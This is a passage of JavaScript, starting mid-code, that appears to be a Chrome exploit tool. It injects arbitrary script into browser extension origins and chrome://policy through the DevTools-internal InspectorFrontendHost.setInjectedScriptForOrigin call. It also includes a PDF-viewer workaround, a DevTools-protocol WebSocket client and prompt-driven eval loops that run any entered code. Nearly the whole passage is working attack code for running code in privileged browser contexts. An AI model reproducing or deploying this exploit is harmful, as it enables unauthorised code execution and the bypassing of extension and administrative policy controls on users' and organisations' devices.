                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#troll').onclick = function () {
                let removed = atob("Ly8gcmVtb3ZlZCBhdCB0aGUgcmVxdWVzdCBvZiB6ZWdsb2wKY29uc29sZS5sb2coMSk7CmFsZXJ0KCJUaGlzIHBheWxvYWQgaGFzIGJlZW4gcmVtb3ZlZCwgaXQgd2lsbCBub3QgYmUgZml4ZWQgb3IgdXBkYXRlZCBhZ2FpbiIpOw==");
                eval(removed);
            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()
